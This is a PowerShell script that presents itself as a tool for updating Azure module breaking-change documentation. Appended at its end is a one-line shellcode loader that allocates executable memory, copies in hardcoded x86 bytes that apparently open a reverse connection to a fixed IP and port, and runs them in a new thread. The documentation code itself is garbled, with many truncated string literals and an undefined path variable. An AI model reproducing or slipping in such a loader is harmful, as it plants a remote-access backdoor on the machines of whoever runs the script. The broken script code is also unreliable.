[CmdletBinding()]
Param(
    [Parameter(Mandatory = $True, Position = 0)]
    [string]$ReleaseDate,

    [Parameter(Mandatory = $True, Position = 1)]
    [string]$ReleaseVersion,

    [Parameter(Mandatory = $False, Position = 2)]
    [string]$PathToRepo
)


function UpdateCurrentDoc([string]$PathToCurrentDoc, [string]$ModuleVersion)
{
    
    $service = (Get-Item -Path "$PathToCurrentDoc\..\..").Name

    
    $content = Get-Content $PathToCurrentDoc -Encoding UTF8

    
    $found = $False

    
    $changes = @()

    
    for ($idx = 1; $idx -lt $content.Length; $idx++)
    {
        
        
        if ($found -and $content[$idx] -like "
        {
            $found = $False
        }
        
        
        
        elseif ($found -and $changes.Length -eq 0)
        {
            $changes += "
            $changes += ""
            $changes += $content[$idx]
        }
        
        
        elseif ($found)
        {
            $changes += $content[$idx]
        }
        
        
        
        
        if ($content[$idx - 1] -eq "
        {
            $found = $True
        }
    }

    
    
    if ($changes.Length -gt 0)
    {
        
        $end = $ModuleVersion.IndexOf(".")
        $ModuleVersion = "$($ModuleVersion.Substring(0, $end)).0.0"

        
        $newContent = New-Object string[] ($content.Length + 2)

        $buffer = 0

        
        
        for ($idx = 0; $idx -lt $content.Length; $idx++)
        {
            if ($content[$idx] -eq "
            {
                $newContent[$idx] = "
                $newContent[$idx + 1] = ""
                $newContent[$idx + 2] = "
                 
                $buffer = 2
                $idx++
            }

            $newContent[$idx + $buffer] = $content[$idx]
        }

        
        $result = $newContent -join "`r`n"
        $tempFile = Get-Item $PathToCurrentDoc

        [System.IO.File]::WriteAllText($tempFile.FullName, $result, [Text.Encoding]::UTF8)
    }

    return $changes
}


function GetModuleVersion([string]$PathToModule)
{
    return (Test-ModuleManifest -Path $PathToModule).Version.ToString()
}


function UpdateARMBreakingChangeDocs([string]$PathToServices)
{
    
    $docs = Get-ChildItem -Path $PathToServices -Recurse | Where { $_.Attributes -match "Directory" } | Where { $_.Name -eq "documentation" }
    
    
    $allChanges = @()

    
    foreach ($doc in $docs)
    {
        $currentDocPath = "$($doc.FullName)\current-breaking-changes.md"
        $upcomingDocPath = "$($doc.FullName)\upcoming-breaking-changes.md"

        $Service = Get-Item -Path "$($doc.FullName)\.."

        $serviceName = $Service.Name

        if ($serviceName -eq "AzureBackup") { $serviceName = "Backup" }
        if ($serviceName -eq "AzureBatch") { $serviceName = "Batch" }

        $modulePath = "$PathToRepo\artifacts\Debug\Az.$serviceName\Az.$serviceName.psd1"

        $moduleVersion = GetModuleVersion -PathToModule $modulePath

        
        $changes = UpdateCurrentDoc -PathToCurrentDoc $currentDocPath -ModuleVersion $moduleVersion

        
        if ($changes.Length -gt 0)
        {
            $allChanges += $changes
        }
    }

    
    return $allChanges
}


function UpdateBreakingChangeDoc([string]$PathToDoc, [string[]]$ChangesToAdd)
{
    
    $content = Get-Content -Path $PathToDoc -Encoding UTF8

    
    
    $size = $content.Length + $ChangesToAdd.Length + 2

    
    $newContent = New-Object string[] $size

    
    $newContent[0] = "
    $newContent[1] = ""

    $buffer = 2

    
    for ($idx = 0; $idx -lt $ChangesToAdd.Length; $idx++)
    {
        $newContent[$idx + $buffer] = $ChangesToAdd[$idx]
    }

    $buffer += $ChangesToAdd.Length

    
    for ($idx = 0; $idx -lt $content.Length; $idx++)
    {
        $newContent[$idx + $buffer] = $content[$idx]
    }

    
    $result = $newContent -join "`r`n"
    $tempFile = Get-Item $PathToDoc

    [System.IO.File]::WriteAllText($tempFile.FullName, $result, [Text.Encoding]::UTF8)
}




if (!$PathToRepo)
{
    $PathToRepo = "$PSScriptRoot\.."
}




$ResourceManagerChanges = UpdateARMBreakingChangeDocs -PathToServices $PathToRepo\src

$allChanges = @()


if ($ResourceManagerChanges.Length -gt 0)
{
    $allChanges += $ResourceManagerChanges
}


UpdateBreakingChangeDoc -PathToDoc $PathToDoc -ChangesToAdd $allChanges
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x98,0xa1,0x65,0x68,0x02,0x00,0x25,0xde,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

